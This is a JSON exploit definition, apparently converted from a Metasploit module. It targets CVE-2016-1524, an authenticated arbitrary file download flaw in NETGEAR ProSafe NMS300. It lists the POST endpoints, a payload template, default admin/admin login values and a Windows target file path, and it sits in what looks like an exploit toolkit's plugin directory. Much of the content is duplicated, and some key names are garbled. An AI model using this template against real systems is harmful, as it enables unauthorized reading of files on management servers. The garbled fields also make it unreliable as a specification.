{
   "references" : [
      "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt",
      "http://seclists.org/fulldisclosure/2016/Feb/30"
   ],
   "msf_module" : "netgear_auth_download",
   "name" : "NetgearAuthDownload",
   "cve" : "CVE-2016-1524",
   "paths" : [
      "userSession.do",
      "userSession.do",
      "data/config/image.do",
      "data/getPage.do",
      "Windows/System32/calc.exe"
   ],
   "description" : "\n\n        Netgear's ProSafe NMS300 is a network management utility that runs on Windows systems.\n\n        The application has a file download vulnerability that can be exploited by an\n\n        authenticated remote attacker to download any file in the system.\n\n        This module has been tested with versions 1.5.0.2, 1.4.0.17 and 1.1.0.13.\n\n      ",
   "method" : "POST",
   "payload" : "everyPage=__EVERYPAGE__&",
   "title" : "NETGEAR ProSafe Network Management System 300 Authenticated File Download",
   "variables" : {
      "SINGLEID" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "EVERYPAGE" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "FILENAME" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "USERNAME" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "PATH" : {
         "DESCRIPTION" : "Path of the file to download minus the drive letter",
         "VALUE" : "/Windows/System32/calc.exe"
      },
      "DEVICETYPE" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "VENDOR" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "PASSWORD" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "REALNAME" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "DESCRIPTION" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "DEVICEMODEL" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "TARGETURI" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "VERSION" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      }
   },
   "detection" : {},
   "password for the specified usertitle" : "admin",
   "informations" : {
      "METHOD" : "POST",
      "PATH" : "userSession.do?method=login&method=loginAgain&method=add&method=getPageList&type=configImgManager&",
      "REFERENCES" : [
         "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt",
         "http://seclists.org/fulldisclosure/2016/Feb/30"
      ],
      "PATHS" : [
         "userSession.do",
         "userSession.do",
         "data/config/image.do",
         "data/getPage.do",
         "Windows/System32/calc.exe"
      ],
      "VARIABLES" : {
         "DEVICEMODEL" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "DESCRIPTION" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "VERSION" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "TARGETURI" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "FILENAME" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "EVERYPAGE" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "SINGLEID" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "PASSWORD" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "VENDOR" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "DEVICETYPE" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "PATH" : {
            "DESCRIPTION" : "Path of the file to download minus the drive letter",
            "VALUE" : "/Windows/System32/calc.exe"
         },
         "USERNAME" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "REALNAME" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         }
      },
      "MSF_MODULE" : "netgear_auth_download",
      "TITLE" : "NETGEAR ProSafe Network Management System 300 Authenticated File Download",
      "THE USERTITLE TO LOGIN AS" : "admin",
      "CVE" : "CVE-2016-1524",
      "PASSWORD FOR THE SPECIFIED USERTITLE" : "admin",
      "name" : "NetgearAuthDownload",
      "PAYLOAD" : "everyPage=__EVERYPAGE__&",
      "DESCRIPTION" : "\n\n        Netgear's ProSafe NMS300 is a network management utility that runs on Windows systems.\n\n        The application has a file download vulnerability that can be exploited by an\n\n        authenticated remote attacker to download any file in the system.\n\n        This module has been tested with versions 1.5.0.2, 1.4.0.17 and 1.1.0.13.\n\n      "
   },
   "the usertitle to login as" : "admin",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "path" : "userSession.do?method=login&method=loginAgain&method=add&method=getPageList&type=configImgManager&"
}
